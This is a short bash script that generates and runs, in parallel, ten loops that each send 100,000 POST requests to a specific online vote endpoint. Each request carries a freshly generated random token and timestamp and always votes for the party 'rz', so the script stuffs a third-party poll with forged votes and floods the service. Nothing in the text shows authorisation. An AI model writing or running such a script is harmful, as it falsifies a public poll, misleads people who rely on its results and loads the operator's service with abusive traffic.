for n in 1 2 3 4 5 6 7 8 9 10; do
cat > "run${n}.sh" <<EOF
#!/bin/bash

URL="https://kalpi.yanivhadad.workers.dev/api/b/sTKFjF7ve/vote"

for i in {1..100000}; do
    TOKEN=\$(cat /proc/sys/kernel/random/uuid | tr -d '-')
    TS=\$(date +%s%3N)

    STATUS=\$(curl -s -o /dev/null -w "%{http_code}" \\
        -X POST "\$URL" \\
        -H "Content-Type: application/json" \\
        -d "{\\"party\\":\\"rz\\",\\"token\\":\\"\$TOKEN\\",\\"ts\\":\\"\$TS\\"}")

    echo "Test ${n} | \$i | \$STATUS"
done
EOF
chmod +x "run${n}.sh"
done

chmod +x run1.sh run2.sh run3.sh run4.sh run5.sh run6.sh run7.sh run8.sh run9.sh run10.sh
./run1.sh &
./run2.sh &
./run3.sh &
./run4.sh &
./run5.sh &
./run6.sh &
./run7.sh &
./run8.sh &
./run9.sh &
./run10.sh &
wait
